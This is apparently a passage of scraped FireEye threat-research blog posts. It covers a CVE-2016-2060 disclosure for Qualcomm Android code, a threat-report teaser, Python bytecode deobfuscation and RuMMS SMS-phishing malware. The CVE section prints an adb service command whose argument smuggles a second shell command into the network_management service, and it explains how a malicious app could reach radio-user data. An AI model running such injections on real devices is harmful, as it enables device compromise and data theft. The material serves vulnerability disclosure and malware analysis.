  Mobile Threat Prevention (MTP) did not initially detect it. It’s hard
  to believe that any antivirus would flag this threat. Additionally,
  the permission required to perform this is requested by millions of
  applications, so it wouldn't tip the user off that something is wrong.</p>
 <h5>
  <b>What could an attacker do if they successfully exploit this vulnerability?</b></h5>
 <p>On older devices, the malicious application can extract the SMS
  database and phone call database, access the Internet, and perform any
  other capabilities allowed by the &quot;radio&quot; user. Some
  examples of potential capabilities of the &quot;radio&quot; user are
  presented in the blog itself, though it was difficult for all of these
  to be tested.</p>
 <p>Newer devices are affected less. The malicious application can
  modify additional system properties maintained by the operating
  system. The impact here depends entirely on how the OEM is using the
  system property subsystem.</p>
 <p>It should be noted that once the vulnerability is exploited, there
  is no indication to the user that something has happened. For example,
  there is no performance impact or risk of crashing the device.</p>
 <h5>
  <b>Are only Android devices affected?</b></h5>
 <p>Since this is an open-source software package developed and made
  freely available by Qualcomm, people are using the code for a variety
  of projects, including Cyanogenmod (a fork of Android). The vulnerable
  APIs have been <a href=""https://github.com/gp-b2g/frameworks_base/commit/ceffdd2daaec524a1c3b8102a1e9a10d51dbde09"">observed
    in a Git repository from 2011</a>, indicating that someone was using
  this code at that time. This will make it particularly difficult to
  patch all affected devices, if not impossible.</p>
 <h5>
  <b>Is this vulnerability being actively targeted or exploited?</b></h5>
 <p>No. The MTP team is monitoring usage of this API, but has not
  discovered anything.</p>
 <h5>
  <b>Are FireEye customers protected?</b></h5>
 <p>FireEye MTP customers will be able to detect attempted exploitation
  of this vulnerability.</p>
 <h4>
  <b>Technical Analysis</b></h4>
 <p>Next we will dive more deeply into CVE-2016-2060 and demonstrate how
  an attacker can exploit the vulnerability, but first an introduction
  to Android system services.</p>
 <h5>Understanding System Services</h5>
 <p>A system service is similar to a <a href=""http://developer.android.com/guide/components/bound-services.html"">regular
    bound service</a> found in an Android application, but a system
  service typically runs in a privileged process, such as the
  “mediaserver” or “system_server”. These services are the core of
  Android, and there are currently 99 system services registered on a
  default emulator build for Android Marshmallow. When USB debugging is
  enabled on a device, the `service` utility can be used to list system
  services registered on the device, shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: Listing system services using
    'service' utility</span></p>
 <p>To illustrate how system services play a role on Android devices, we
  walk through the process of sending a text message (SMS) from an
  Android application. Figure 2 shows a Java snippet that can be used to
  send an SMS message with the content of “Test” to the number 1234567890:</p>
 <p>
  <span class=""code"">        SmsManager smsManager = SmsManager.getDefault();</span>
  <br /> <span class=""code"">       
    smsManager.sendTextMessage(“1234567890”, null, “Test”, null, null);</span></p>
 <p>
  <span class=""type-XS"">Figure 2: Sending an SMS message from an
    application (from <a href=""http://stackoverflow.com/questions/4967448/send-sms-in-android"">StackOverflow</a>)</span></p>
 <p>The code first obtains the SmsManager object associated with the
  default subscription ID using the static method “getDefault()”, and
  then calls the method “sendTextMessage(..)” with the appropriate
  arguments. The <a href=""http://developer.android.com/reference/android/telephony/SmsManager.html"">SmsManager
  class</a> contains other SMS-related methods such as
  “downloadMultimediaMessage(..)” and “sendMultipartTextMessage(..)”.</p>
 <p>Next, we’ll look at the <a href=""https://android.googlesource.com/platform/frameworks/opt/telephony/+/android-4.4.4_r2.0.1/src/java/android/telephony/SmsManager.java"">Java
  source</a> for the “sendTextMessage(..)” method of the SmsManager
  class used previously. For simplicity, we view the source for the
  SmsManager class included as part of Android 4.4 (“KitKat”), shown in
  Figure 3.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Java source of “sendTextMessage(..)” method</span></p>
 <p>This method performs two functions: it first performs basic argument
  checking and then attempts to interact with a system service called
  “isms”. The “getService(..)” method of the ServiceManager class is
  used to obtain an IBinder object, which is then cast to an ISms object
  by using the “asInterface(..)” method. At this point, methods can be
  called from the “isms” system service using the <a href=""http://elinux.org/Android_Binder"">Binder interface</a>, which
  in this case is the method “sendText(..)”. Note that use of the
  ServiceManager class is not available to application developers using
  the Android SDK. This indicates that the SmsManager class is merely a
  wrapper for the “isms” system service, and this particular pattern is
  consistent across many other APIs such as location and telephony.</p>
 <h5>Calling System Services Directly</h5>
 <p>While Google does not recommend bypassing their official APIs to
  interact with a system service directly, it is possible to do so. To
  do this in an application, a developer has to import and use
  non-standard APIs (namely the aforementioned ServiceManager class). As
  an alternative, the `service` utility mentioned earlier can be used
  from the command line. In order to utilize the `service` utility, we
  need to gather additional pieces of information: the transaction ID of
  the method we would like to call and information regarding the arguments.</p>
 <h5>Obtaining a Transaction ID</h5>
 <p>When creating a bound Service in an Android application, the first
  step is to define the service interface using the <a href=""http://developer.android.com/guide/components/aidl.html"">Android
    Interface Definition Language (AIDL)</a>. When an AIDL file is
  compiled by the `aidl` utility during the application build process, a
  unique identifier is stored for each method of the interface in the
  form of a static field of the “Stub” inner-class. Developers rely on
  the method names and not these transaction IDs, as they will change
  between API builds and across vendors.</p>
 <p>To illustrate this for the previous SMS example, we investigate the
  class “com.android.internal.telephony.Isms.Stub”, which is typically
  found on a device in the system JAR file
  “/system/framework/framework.jar”. By disassembling this JAR, we can
  determine the transaction ID for the method “sendText()”, which is 0xb
  hexadecimal or 11 decimal on this device, shown in Figure 4.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Obtaining the transaction ID of the
    “sendText(..)” method</span></p>
 <h5>Determining Method Arguments</h5>
 <p>Now that we understand the transaction ID, we need to determine how
  to interact with the method. If the system service of interest is
  public like the “isms” service, the <a href=""https://android.googlesource.com/platform/frameworks/base/+/android-4.4.4_r2.0.1/telephony/java/com/android/internal/telephony/ISms.aidl"">AIDL
    source can be reviewed</a>. If it is not, the service implementation
  needs to be reversed in order to determine the purpose of each
  argument. If we dissemble the inner-class
  “com.android.internal.telephony.Isms.Stub.Proxy” included in
  aforementioned “framework.jar”, we should be able to get an idea of
  what each of the augments represent and determine the return type.
  Figure 5 shows the arguments and return value for the “sendText(..)” method.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Method prototype of “sendText(..)” method</span></p>
 <p>In the screenshot above we see that the “sendText(..)” method takes
  six arguments, denoted by the “p<i>n</i>” notation, and returns a
  void, as denoted by the trailing “V” in method prototype.</p>
 <h5>Putting it All Together</h5>
 <p>Now we can use the `service` utility to interact with the “isms”
  service and call the “sendText(..)” method. Figure 6 shows the syntax
  for the `service` utility to call a system service’s method.</p>
 <p>    <span class=""code"">service call service_name transaction_id [arguments]</span></p>
 <p>
  <span class=""type-XS"">Figure 6: 'service</span></p>
 <p>
  <span class=""type-XS"">utility syntax to call service method</span></p>
 <p>The 'service' utility accepts string, integer, and null value
  arguments, represented by “s16”, “i32”, and “null”, respectively. Note
  that for anything more complex, a Java application must be used. We
  can now call the “sendText(..)” method, which has the transaction ID
  of 11, of the “isms” system service to send a message, shown in Figure 7.</p>
 <p>    <span class=""code"">adb shell service call isms 11 s16
    &quot;com.fake&quot; s16 &quot;1234567890&quot; s16
    &quot;1234567890&quot; s16 &quot;Test&quot; i32 0 i32 0</span></p>
 <p>
  <span class=""type-XS"">Figure 7: Invoking “sendText(..)” using
    'service' utility</span></p>
 <p>This command shown sends an SMS message with the content of “Test”
  to the number 1234567890, similar to the Java snippet in Figure 2.</p>
 <h4>Exploring CVE-2016-2060</h4>
 <h5>Starting from the Top</h5>
 <p>Device manufactures and other non-Android Open Source Project (AOSP)
  vendors add and modify system services on a regular basis. From an
  attacker’s perspective, new or changed APIs in system services are a
  prime target. A researcher can enumerate these by comparing the static
  fields beginning with “TRANSACTION_” found within the “Stub”
  inner-class of system services on a target device to that of the AOSP.
  During one such review, we discovered two methods added to the
  “network_management” system service called
  “addUpstreamV6Interface(..)” and “removeUpstreamV6Interface(..)”,
  found in “android.os.INetworkManagementService.Stub”, which is part of
  the system JAR “/system/framework/framework.jar”. This is depicted in
  Figure 8 and Figure 9.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: “addUpstreamV6Interface(..)”
    transaction ID 0x1e (30)</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: “removeUpstreamV6Interface(..)”
    transaction ID 0x1f (31)</span></p>
 <p>The “addUpstreamV6Interface(..)” method accepts a single string
  argument, interface_value, and returns void. Viewing the disassembled
  method “addUpstreamV6Interface(..)” of the class
  “com.android.server.NetworkManagementService” found in the system JAR
  “/system/framework/services.jar” indicated that when called, the
  method passed interface_value to the native daemon “netd” by writing
  the string shown in Figure 10 to the UNIX socket “/dev/socket/netd”.</p>
 <p>    <span class=""code"">tether interface add_upstream interface_value</span></p>
 <p>
  <span class=""type-XS"">Figure 10: Command sent to “netd” native daemon</span></p>
 <p>From here, analysis of the “/system/bin/netd” indicated that this
  daemon executed “/system/bin/radish” using the “execv(..)” function
  which executes the shell command depicted in Figure 11.</p>
 <p>    <span class=""code"">/system/bin/radish –i interface_value –x -t</span></p>
 <p>
  <span class=""type-XS"">Figure 11: Arguments passed to “/system/bin/radish”</span></p>
 <p>The “/system/bin/radish” executable then passed the interface_value
  to the `brctl` utility using the “system(..)” function, using the
  syntax depicted in Figure 12.</p>
 <p>    <span class=""code"">brctl addif bridge0 interface_value</span></p>
 <p>
  <span class=""type-XS"">Figure 12: interface_value present in `brctl` command</span></p>
 <p>It is at this point we witness the code execution capabilities of
  CVE-2016-2060: any value passed to the “addUpstreamV6Interface(..)” is
  ultimately passed to the “system()” function without being sanitized
  or validated. A trivial example of this can be achieved with the
  `service` command shown in Figure 13, which prints the output of the
  `id` command to the Android log buffers:</p>
 <p>    <span class=""code"">adb shell 'service call network_management 30
    s16 '\''fake; log -t radio_exe &quot;`id`&quot;'\'''</span></p>
 <p>
  <span class=""type-XS"">Figure 13: 'service' command to write the output
    of 'id' to Android log buffers</span></p>
 <p>This command passes the interface_value of '\''fake; log -t
  radio_exe &quot;`id`&quot;'\''' to the “/system/bin/radish”
  executable, which calls the “system()” function with the string shown
  in Figure 14.</p>
 <p>    <span class=""code"">brctl addif bridge0 fake; log -t radio_exe &quot;`id`&quot;</span></p>
 <p>
  <span class=""type-XS"">Figure 14: Command injection into `brctl`
    “system()” function</span></p>
 <p>We can check the Android log buffers to capture the output of our
  injected commands using the <a href=""http://developer.android.com/tools/help/logcat.html"">`logcat`
  utility</a>, shown in Figure 15.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Output of 'id' captured in the
    Android log buffers</span></p>
 <p>The output of the `id` command indicates that we are running as the
  Linux UID 1001 (“radio”) and under the SEAndroid context of “netd”.
  Next, we explore how an attacker would take advantage of this
  vulnerability and what actions this permits the attacker.</p>
 <h5>Practical Exploitation</h5>
 <p>The most feasible way of exploiting CVE-2016-2060 is by creating a
  malicious application. A malicious application needs only to request
  access to the <a href=""http://developer.android.com/reference/android/Manifest.permission.html#ACCESS_NETWORK_STATE"">“ACCESS_NETWORK_STATE”</a>
  permission, a widely requested permission. Figure 16 shows how the
  “addUpstreamV6Interface(..)” method can be used to inject the command 'id'.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Qualcomm%20Valetta/Fig16.PNG"" /></p>
 <p>
  <span class=""type-XS"">Figure 16: Malicious application calling “addUpstreamV6Interface(..)”</span></p>
 <p>Since the commands above are executed as the user “radio”, data
  owned by applications that are also running as “radio” are accessible
  to the malicious application. On stock Android devices, this includes
  the <a href=""https://android.googlesource.com/platform/packages/services/Telephony/+/android-6.0.1_r21/AndroidManifest.xml"">Phone
  application</a> and the <a href=""https://android.googlesource.com/platform/packages/providers/TelephonyProvider/+/android-6.0.1_r21/AndroidManifest.xml"">Telephony
    Providers application</a>, both of which contain sensitive
  information. The “radio” user also inherits several system permissions
  not accessible to a third-party application. A short list includes:</p>
 <ul> <li>WRITE_SETTINGS_SECURE – Change key system settings</li>
    <li>BLUETOOTH_ADMIN – Discover and pair with Bluetooth devices</li>
    <li>WRITE_APN_SETTINGS – Change APN settings</li>
    <li>DISABLE_KEYGUARD – Disable the key guard (lock screen)</li> </ul>
 <p>Whether or not an attacker can abuse these permissions depends on
  the specific model, and may not be possible across all devices.</p>
 <h4>SEAndroid Considerations</h4>
 <p>Beginning in Android 4.4 (“KitKat”), devices utilize Security
  Enhancements for Android™ (SEAndroid) and set enforcing mode by
  default. Devices running SEAndroid in this mode are not impacted as
  significantly as older devices. The <a href=""https://android.googlesource.com/platform/external/sepolicy/+/android-6.0.1_r21/netd.te"">“netd”
  context</a> that the “/system/bin/radish” executable runs as does not
  have the ability to interact with other “radio” user application data,
  has limited filesystem write capabilities and is typically limited in
  terms of application interactions. The “netd” context does have the
  ability to alter “system_prop” properties of the Android property
  subsystem, which includes the “service.”, “persist.sys.”,
  “persist.service.”, and “persist.security.” property keys. Depending
  on how a particular device manufacture utilizes these properties, it
  is possible to further compromise a device by altering these properties.</p>
 <h4>Conclusions</h4>
 <p>CVE-2016-2060 has been present on devices since at least 2011 and
  likely affects hundreds of Android models around the world. This
  vulnerability allows a seemingly benign application to access
  sensitive user data including SMS and call history and the ability to
  perform potentially sensitive actions such as changing system settings
  or disabling the lock screen. Devices running Android 4.3 (“Jellybean
  MR2”) or older are the most affected by the vulnerability, and are
  likely to remain unpatched. Newer devices utilizing SEAndroid are
  still affected, but to a lesser extent.</p>
 <p>FireEye would like to thank Qualcomm for both working diligently to
  address CVE-2016-2060 and for supporting the release of this blog
  post. For FireEye Mobile Threat Prevention (MTP) customers, FireEye
  has added detection of CVE-2016-2060 exploitation on devices as of
  writing this blog post.</p>",http://www.fireeye.com/blog/threat-research/2016/05/exploiting_cve-2016-.html
"A Cyber Revolution: Advanced Attacks Increasing in EMEA Reflect
Political Tension","<p>Financial, geopolitical and economical changes made 2015 a very busy
  year for the Europe, Middle East and Africa (EMEA) region,
  particularly in the cyber realm. FireEye has been monitoring these
  shifting cyber trends and has identified considerable evolutions to
  the EMEA threat landscape when comparing the second half of the year
  to the first half.<img class=""float-right"" src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/apt-emea.jpg"" /></p>
 <p>To share our observations, we present the <a href=""https://www2.fireeye.com/WEB-2016-RPT-ATR-EMEA.html"">FireEye
    Regional Advanced Threat Report for EMEA 2H2015</a>, a follow on
  report from our <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/executive-perspective/2015/09/regional_advancedth.html"">mid-2015</a>
  publication. This report provides an overview of the advanced
  persistent threats (APT) targeting computer networks in EMEA during
  the second half of 2015, and also contains various other key
  observations, including:</p>
 <ul> <li>Cyber attacks continue to reflect ongoing “real world” events.
    In the second half of 2015, with political tensions in Turkey and
    financial tensions on European markets with uncertain outlooks, we
    observed similar patterns in cyber threats.</li> <li>Turkey, Spain,
    Israel, Belgium, Luxembourg, Germany and Great Britain represent
    more than 60 percent of total alerts associated with advanced threat
    activity seen in 2H2015.</li> <li>Ransomware continues to pose a
    threat to organisations, and the malware development lifecycle is so
    short that many organisations continue to struggle at defending
    against compromises.</li> <li>Cybercriminals continue to utilise
    macro embedded Microsoft Office documents to deliver malicious
  payloads.</li> <li>Advanced threats are increasingly targeting
    governments and the financial services industry, and there has been
    a significant increase in attacks targeting the aerospace and
    defense industry.</li> </ul>
 <p> </p>
 <p>Looking forward, we predict that malicious actors targeting entities
  in the EMEA region are going to become even more disruptive by either
  changing data or destroying it. As such, this report additionally
  includes some recommendations on how to best defend against today’s
  attackers and other threats.</p>
 <p>
  <a href=""https://www2.fireeye.com/WEB-2016-RPT-ATR-EMEA.html"" target=""_blank"">View the
    full report.</a></p>
 <p>Join us for a live webinar on Thursday, May 19 2016, 1PM (BST) as we
  discuss the latest findings from the report.<br />  <br /> <a href=""https://www.brighttalk.com/webcast/10703/199041?utm_source=blog"" target=""_blank"">You can register here.</a></p>
 <p>To continue the conversation, join us on Twitter from 2pm BST
  onwards on May 19th for a Twitter Chat with the authors of the report,
  using hashtag #AskFEYE.<br /> <br /> </p>",http://www.fireeye.com/blog/threat-research/2016/05/a_cyber_revolution.html
Deobfuscating Python Bytecode,"<h5>
  <b>Introduction</b></h5>
 <p>During an investigation, the FLARE team came across an interesting
  Python malware sample (MD5: <span class=""code"">61a9f80612d3f7566db5bdf37bbf22cf </span>) that is
  packaged using <a href=""http://www.py2exe.org"" target=""_blank"">py2exe</a>. Py2exe is a popular way to
  compile and package Python scripts into executables. When we encounter
  this type of malware we typically just decompile and read the Python
  source code. However, this malware was different, it had its bytecode
  manipulated to prevent it from being decompiled easily!</p>
 <p>In this blog we’ll analyze the malware and show how we removed the
  obfuscation, which allowed us to produce a clean decompile. Here we
  release source code to our bytecode_graph module to help you analyze
  obfuscated Python bytecode
  (https://github.com/fireeye/flare-bytecode_graph). This module allows
  you to remove instructions from a bytecode stream, refactor offsets
  and generate a new code object that can be further analyzed.</p>
 <h5>
  <b>Background</b></h5>
 <p>Py2exe is a utility that turns a Python script into an executable,
  which allows it to run on a system without a Python interpreter
  installed. Analyzing a Py2exe binary is generally a straightforward
  process that starts with extracting the Python bytecode followed by
  decompiling the code object with a module such as <span class=""code"">
    <a href=""http://srossross.github.io/Meta/html/api/decompile.html"" target=""_blank"">meta</a>
  </span>or <span class=""code"">
    <a href=""https://github.com/wibiti/uncompyle2"" target=""_blank"">uncompyle2</a></span>.
  Appendix A contains an example script that demonstrates how to extract
  a code object from a Py2exe binary.</p>
 <p>When attempting to decompile this sample using uncompyle2, the
  exception shown in Figure 1 is generated. The exception suggests the
  bytecode stream contains code sequences that the decompiler is not expecting.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig1.png"" />
  <br /> </p>
 <p>
  <span class=""type-XS"">Figure 1: Uncompyle2 exception trace</span></p>
 <h4>
  <b>Obfuscation that breaks decompilers</b></h4>
 <p>To understand why the decompiler is failing, we first need to take a
  closer look at the bytecode disassembly. A simple method to
  disassemble Python bytecode is to use the built-in module <span class=""code"">
    <a href=""https://docs.python.org/2/library/dis.html"" target=""_blank"">dis</a></span>. When
  using the <span class=""code"">dis</span> module, it is important to use
  the same version of Python as the bytecode to get an accurate
  disassembly. Figure 2 contains an example interactive session that
  disassembles the script “import sys”. Each line in the disassembly
  output contains an optional line number, followed by the bytecode
  offset and finally the bytecode instruction mnemonic and any arguments.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2:  Example bytecode disassembly</span></p>
 <p>Using the example script from Appendix A, we can view the
  disassembly of the code object to get a better idea what is causing
  the decompiler to fail. Figure 3 contains a portion of the disassembly
  produced by running script on this sample.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Bytecode disassembly</span></p>
 <p>Looking closer at the disassembly, notice there are several
  unnecessary bytecode sequences that have no effect on the logic of the
  code. This suggests that a standard compiler did not produce the
  bytecode. The first surprising bytecode construct is the use of <span class=""code"">NOP</span>s, for example, found at bytecode offset 0. The
    <span class=""code"">NOP</span> instruction is not typically included
  in compiled Python code because the interpreter does not have to deal
  with pipelining issues. The second surprising bytecode construct is
  the series of <span class=""code"">
    <a href=""https://docs.python.org/2/library/dis.html#opcode-ROT_TWO"" target=""_blank"">ROT_TWO</a>
  </span>and <span class=""code"">
    <a href=""https://docs.python.org/2/library/dis.html#opcode-ROT_THREE"" target=""_blank"">ROT_THREE</a>
  </span>instructions. The <span class=""code"">ROT_TWO </span>instruction
  rotates the top two stack items and the <span class=""code"">ROT_THREE</span> rotates the top three stack items. By
  calling two successive <span class=""code"">ROT_TWO</span> or three
    <span class=""code"">ROT_THREE</span> instructions, the stack is
  returned to the same state as before the instruction sequence. So,
  these sequences have no effect on the logic of the code, but may
  confuse decompilers. Lastly, the <span class=""code"">LOAD_CONST</span>
  and <span class=""code"">POP_TOP</span> combinations are unnecessary.
  The <span class=""code"">LOAD_CONST</span> instruction pushes a constant
  onto the stack while the <span class=""code"">POP_TOP</span> removes it.
  This again leaves the stack in its original state.</p>
 <p>These unnecessary code sequences prevent decompiling bytecode using
  modules such as <span class=""code"">meta</span> and <span class=""code"">uncompyle2</span>. Many of the <span class=""code"">ROT_TWO</span> and <span class=""code"">ROT_THREE</span>
  sequences operate on an empty stack that generates errors when
  inspected because both modules use a Python List object to simulate
  the runtime stack. A <span class=""code"">pop</span> operation on the
  empty list generates exceptions that halt the decompilation process.
  In contrast, when Python interpreter executes the bytecode, no checks
  are made on the stack before performing operations on it. Take for
  example <span class=""code"">ROT_TWO</span> from <span class=""code"">
    <a href=""https://github.com/python/cpython/blob/master/Python/ceval.c#L1400"" target=""_blank"">ceval.c</a>
  </span>in Figure 4.        <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: ROT_TWO source</span></p>
 <p>Looking at the macro definitions for <span class=""code"">TOP, SECOND,
  SET_TOP</span> and <span class=""code"">SET_SECOND</span> from <span class=""code"">
    <a href=""https://github.com/python/cpython/blob/master/Python/ceval.c#L1048"" target=""_blank"">ceval.c</a></span>
  in Figure 5, the lack of sanity checks allow these code sequences to
  execute without stopping.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig5.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 5: Macro definitions</span></p>
 <p>The <span class=""code"">NOP</span>s and <span class=""code"">LOAD_CONST/POP_TOP</span> sequences stop the
  decompilation process in situations where the next or previous
  instructions are expected to be a specific value. An example debug
  trace for <span class=""code"">uncompyle2</span> is shown in Figure 6
  where the previous instruction is expected to be a jump or a return.</p>
 <h5>
  <b>Removing the obfuscation</b></h5>
 <p>Now that the types of obfuscation have been identified, the next
  step is to clean the bytecode in hopes of getting a successful
  decompile. The <span class=""code"">opmap</span> dictionary from the
    <span class=""code"">dis</span> module is very helpful when
  manipulating bytecode streams. When using <span class=""code"">opmap</span>, instructions can be referenced by name
  rather than a specific bytecode value. For example, the <span class=""code"">NOP</span> bytecode binary value is available with <span class=""code"">dis.opmap[‘NOP’]</span>.</p>
 <p>Appendix B contains an example script that replaces the <span class=""code"">ROT_TWO, ROT_THREE</span> and <span class=""code"">LOAD_CONST/POP_TOP</span> sequences with <span class=""code"">NOP</span> instructions and creates a new code object.
  The disassembly produced from running the script in Appendix A on the
  malware is shown in Figure 6.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Clean disassembly</span></p>
 <p>At this point, the disassembly is somewhat easier to read with the
  unnecessary instruction sequences replaced with NOPs, but the bytecode
  still fails to decompile. The failure is due how <span class=""code"">uncompyle2</span> and <span class=""code"">meta</span> deal
  with exceptions. The problem is demonstrated in Figure 7 with a simple
  script that includes an exception handler.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Exception handler</span></p>
 <p>In Figure 7, the exception handler is created using the <span class=""code"">SETUP_EXCEPT </span>instruction at offset 0 with the
  handler code beginning at offset <span class=""code"">13</span> with the
  three <span class=""code"">POP_TOP</span> instructions. Both the <span class=""code"">meta</span> and <span class=""code"">uncompyle2</span>
  modules inspect the instruction prior to the exception handler to
  verify it is a jump instruction. If the instruction isn’t a jump, the
  decompile process is halted. In the case of this malware, the
  instruction is a <span class=""code"">NOP</span> because of the
  obfuscation instructions were removed.</p>
 <p>At this point, to get a successful decompile, we have two options.
  First, we can reorder instructions to make sure they are where the
  decompiler expects them. Alternatively, we can remove all the NOP
  instructions. Both strategies can be complicated and tedious because
  absolute and relative addresses for any jump instructions need to also
  be updated. This is where the <span class=""code"">bytecode_graph</span>
  module comes in.  Using the <span class=""code"">bytecode_graph</span>
  module, it’s easy to replace and remove instructions from a bytecode
  stream and generate a new stream with offsets automatically updated
  accordingly. Figure 8 shows an example function that uses the <span class=""code"">bytecode_graph </span>module to remove all NOP
  instructions from a code object.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Example bytecode_graph removing NOP instructions</span></p>
 <h4>
  <b>Summary</b>
  <br /> </h4>
 <p>In this blog I’ve demonstrated how to remove a simple obfuscation
  from a Python code object using the <span class=""code"">bytecode_graph</span> module. I think you’ll find it easy
  to use and a perfect tool for dealing with tricky py2exe samples. You
  can download <span class=""code"">bytecode_graph</span> via pip (<span class=""code"">pip install bytecode-graph</span>) or from the FLARE
  team’s Github page: https://github.com/fireeye/flare-bytecode_graph.</p>
 <p>An example script that removes the obfuscation discussed in this
  blog can be found here:
  https://github.com/fireeye/flare-bytecode_graph/blob/master/examples/bytecode_deobf_blog.py.Hashes
  identified that implement this bytecode obfuscation:</p>
 <p>        <span class=""code"">61a9f80612d3f7566db5bdf37bbf22cf<br />
  </span>        <span class=""code"">ff720db99531767907c943b62d39c06d<br />  </span>       
    <span class=""code"">aad6c679b7046e568d6591ab2bc76360<br />
  </span>        <span class=""code"">ba7d3868cb7350fddb903c7f5f07af85</span></p>
 <h4>Appendix A: Python script to extract and disassemble Py2exe resource</h4>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Appendix%20A.png"" /></p>
 <h4>Appendix B: Sample script to remove obfuscation</h4>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Flare%20Homan/Appendix%20B.png"" /></p>",http://www.fireeye.com/blog/threat-research/2016/05/deobfuscating_python.html
"RuMMS: The Latest Family of Android Malware Attacking Users in Russia
Via SMS Phishing","<h5>
  <b>Introduction</b></h5>
 <p>Recently we observed an Android malware family being used to attack
  users in Russia. The malware samples were mainly distributed through a
  series of malicious subdomains registered under a legitimate domain
  belonging to a well-known shared hosting service provider in Russia.
  Because all the URLs used in this campaign have the form of
  hxxp://yyyyyyyy[.]XXXX.ru/mms.apk (where XXXX.ru represents the
  hosting provider’s domain), we named this malware family RuMMS.</p>
 <p>To lure the victims to download the malware, threat actors use SMS
  phishing – sending a short SMS message containing a malicious URL to
  the potential victims. Unwary users who click the seemingly innocuous
  link will have their device infected with RuMMS malware. Figure 1
  describes this infection process and the main behaviors of RuMMS.</p>
 <p></p>
 <p>
  <span class=""type-XS"">Figure 1. Overview of the RuMMS campaign and behaviors</span></p>
 <p>On April 3, 2016, we still observed new RuMMS samples emerging in
  the wild. The earliest identified sample, however, can be traced back
  to Jan. 18, 2016. Within this time period, we identified close to 300
  samples belonging to this family (all sample hashes are listed in the Appendix).</p>
 <p>After landing on the victim’s phone, the RuMMS apps will request
  device administrator privileges, remove their icons to hide themselves
  from users, and remain running in the background to perform a series
  of malicious behaviors. So far we have identified the following behaviors:</p>
 <p>●      Sending device information to a remote command and control
  (C2) server.</p>
 <p>●      Contacting the C2 server for instructions.</p>
 <ul> <li>Sending SMS messages to financial institutions to query
    account balances.</li> <li>Uploading any incoming SMS messages
    (including the balance inquiry results) to the remote C2
  server.</li> <li>Sending C2-specified SMS messages to phone numbers in
    the victim’s contacts.</li> <li>Forward incoming phone calls to
    intercept voice-based two-factor authentication.</li> </ul>
 <p>Each of these behaviors is under the control of the remote C2
  server. In other words, the C2 server can specify the message contents
  to be sent, the time period in which to forward the voice call, and
  the recipients of outgoing messages. As part of our investigation into
  this malware, we emulated an infected Android device in order to
  communicate with the RuMMS C2 server. During one session, the C2
  server commanded our emulated device to send four different SMS
  messages to four different phone numbers, all of which were associated
  with Russian financial institutions. At least three of the messages
  were intended to check a user’s account balance at the institution (we
  could not confirm the purpose of the fourth).Through additional
  research, we identified several forum posts where victims complained
  of funds (up to 600 rubles) were transferred out of their accounts
  after RuMMS infected their phones.</p>
 <p>We do not know exactly how many people have been infected with RuMMS
  malware. However, our data suggests that there have been at least
  2,729 infections between January 2016 and early April 2016, with a
  peak in March of more than 1,100 infections.</p>
 <h5>
  <b>Smishing: The Major Way To Distribute RuMMS</b></h5>
 <p>We have not observed any instances of RuMMS on Google Play or other
  online app stores. Smishing (SMS phishing) is currently the primary
  way threat actors are distributing the malware. The process starts
  when an SMS phishing message arrives at a user’s phone. An example SMS
  message is shown in Figure 1. The message translates roughly to“ You
  got a photo in MMS format: hxxp://yyyyyyyy.XXXX.ru/mms.apk.”</p>
 <p>So far we identified seven different URLs being used to spread RuMMS
  in the wild. All of the URLs reference the file “mms.apk” and all use
  the domain “XXXX.ru”, which belongs to a top five shared hosting
  platform in Russia (the domain itself has been obfuscated to anonymize
  the provider).</p>
 <p>The threat actors registered at least seven subdomains through the
  hosting provider, each consisting of eight random-looking characters
  (asdfgjcr, cacama18, cacamadf, konkonq2, mmsmtsh5, riveroer, and
  sdfkjhl2.) As of this writing, no files were hosted at any of the
  links. The threat actors seem to have abandoned these URLs and might
  be looking into other ways to reach more victims.</p>
